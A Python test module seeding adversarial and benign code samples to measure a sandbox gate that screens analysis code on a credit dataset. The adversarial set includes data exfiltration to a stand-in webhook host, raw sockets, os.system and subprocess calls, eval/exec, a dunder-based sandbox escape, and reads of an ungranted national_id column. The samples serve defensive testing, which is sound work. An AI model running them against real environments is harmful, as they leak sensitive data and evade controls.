"""A seeded corpus of adversarial and benign code, for the gate's metrics.

Section 16 sets two numbers on the gate: true-block rate 100% on a seeded
adversarial set, and false-block rate under 5% on benign analyses. This module
is that seeded set, kept in code so it is testable and so the Gate screen can
offer the samples as "try a risky request" examples. Never fake the block: every
adversarial sample is real code with a real violation the gate genuinely catches.
"""

from __future__ import annotations

from dataclasses import dataclass

# The fair_lending_review grant, so CTL-COL-01 is active for both sets.
GRANT = [
    "age_band",
    "y",
    "pred",
    "credit_amount",
    "duration_months",
    "digital_engagement_score",
]


@dataclass(frozen=True)
class Sample:
    name: str
    code: str
    expected_control: str | None  # None means benign (must pass the gate)


# -- adversarial: each must be blocked, on the named control ---------------
ADVERSARIAL: list[Sample] = [
    Sample(
        "webhook exfiltration (no import)",
        'df = ctx.table("german_credit")\n'
        'requests.post("https://x.example/hook", json=df["pred"].tolist())\n',
        "CTL-EGRESS-01",
    ),
    Sample(
        "imported requests",
        "import requests\nrequests.get('http://x.example')\n",
        "CTL-EGRESS-01",
    ),
    Sample(
        "urllib exfiltration",
        "import urllib.request\nurllib.request.urlopen('http://x.example')\n",
        "CTL-EGRESS-01",
    ),
    Sample(
        "raw socket",
        "import socket\ns = socket.socket()\n",
        "CTL-EGRESS-01",
    ),
    Sample(
        "file write",
        'df = ctx.table("german_credit")\nopen("/tmp/leak.csv", "w").write(df.to_csv())\n',
        "CTL-CODE-02",
    ),
    Sample(
        "os.system",
        "import os\nos.system('id')\n",
        "CTL-CODE-02",
    ),
    Sample(
        "subprocess",
        "import subprocess\nsubprocess.run(['ls'])\n",
        "CTL-CODE-02",
    ),
    Sample(
        "eval of a param",
        'spec = eval(ctx.param("spec"))\n',
        "CTL-CODE-03",
    ),
    Sample(
        "exec of a string",
        "exec('x = 1')\n",
        "CTL-CODE-03",
    ),
    Sample(
        "pickle import",
        "import pickle\n",
        "CTL-CODE-03",
    ),
    Sample(
        "importlib dynamic import",
        "import importlib\nm = importlib.import_module('os')\n",
        "CTL-CODE-03",
    ),
    Sample(
        "dunder subclass escape",
        "cls = ().__class__.__bases__[0].__subclasses__()\n",
        "CTL-CODE-04",
    ),
    Sample(
        "non-allowlisted import",
        "import yaml\n",
        "CTL-CODE-01",
    ),
    Sample(
        "ungranted column",
        'df = ctx.table("german_credit")\nleak = df["national_id"]\nctx.emit(leak)\n',
        "CTL-COL-01",
    ),
    # The sqlglot half of the gate, reached through ctx.sql (v2).
    Sample(
        "sql select star",
        'df = ctx.sql("SELECT * FROM german_credit")\nctx.emit(df)\n',
        "CTL-COL-01",
    ),
    Sample(
        "sql ungranted column",
        'df = ctx.sql("SELECT age_band, national_id FROM german_credit")\nctx.emit(df)\n',
        "CTL-COL-01",
    ),
    Sample(
        "sql cartesian join",
        'df = ctx.sql("SELECT age_band FROM german_credit, german_credit")\nctx.emit(df)\n',
        "CTL-COMPLEX-01",
    ),
    Sample(
        "sql built from a variable",
        "q = 'SELECT ' + ctx.param('cols') + ' FROM german_credit'\n"
        "df = ctx.sql(q)\nctx.emit(df)\n",
        "CTL-COL-01",
    ),
]


# -- benign: each must pass the gate ---------------------------------------
BENIGN: list[Sample] = [
    Sample(
        "fairlearn selection rate",
        "import fairlearn.metrics as flm\n"
        'df = ctx.table("german_credit")\n'
        "mf = flm.MetricFrame(metrics={'selection_rate': flm.selection_rate, 'n': flm.count},"
        " y_true=df['y'], y_pred=df['pred'], sensitive_features=df['age_band'])\n"
        "ctx.emit(mf.by_group.reset_index())\n",
        None,
    ),
    Sample(
        "pandas groupby",
        'df = ctx.table("german_credit")\n'
        "g = df.groupby('age_band', as_index=False).agg(n=('pred', 'count'),"
        " rate=('pred', 'mean'))\n"
        "ctx.emit(g)\n",
        None,
    ),
    Sample(
        "numpy summary",
        "import numpy as np\n"
        'df = ctx.table("german_credit")\n'
        "ctx.emit({'mean_amount': float(np.mean(df['credit_amount']))})\n",
        None,
    ),
    Sample(
        "sklearn metric",
        "from sklearn.metrics import roc_auc_score\n"
        'df = ctx.table("german_credit")\n'
        "ctx.emit({'auc': float(roc_auc_score(df['y'], df['pred']))})\n",
        None,
    ),
    Sample(
        "scipy stats",
        "import pandas as pd\n"
        "from scipy.stats import chi2_contingency\n"
        'df = ctx.table("german_credit")\n'
        "ct = pd.crosstab(df['age_band'], df['pred'])\n"
        "chi2, p, dof, exp = chi2_contingency(ct)\n"
        "ctx.emit({'p_value': float(p)})\n",
        None,
    ),
    Sample(
        "statsmodels logit",
        "import statsmodels.api as sm\n"
        'df = ctx.table("german_credit")\n'
        "model = sm.Logit(df['y'], sm.add_constant(df['credit_amount'])).fit(disp=0)\n"
        "ctx.emit({'params': model.params.to_dict()})\n",
        None,
    ),
    Sample(
        "fairlearn reductions import",
        "from fairlearn.reductions import ExponentiatedGradient\n"
        'df = ctx.table("german_credit")\n'
        "ctx.emit({'rows': int(len(df))})\n",
        None,
    ),
    Sample(
        "read-mode open is allowed",
        'df = ctx.table("german_credit")\nctx.emit({"n": int(len(df))})\n',
        None,
    ),
    Sample(
        "sql grouped selection rate",
        'df = ctx.sql("SELECT age_band, AVG(pred) AS selection_rate, '
        'COUNT(*) AS n FROM german_credit GROUP BY age_band")\nctx.emit(df)\n',
        None,
    ),
]
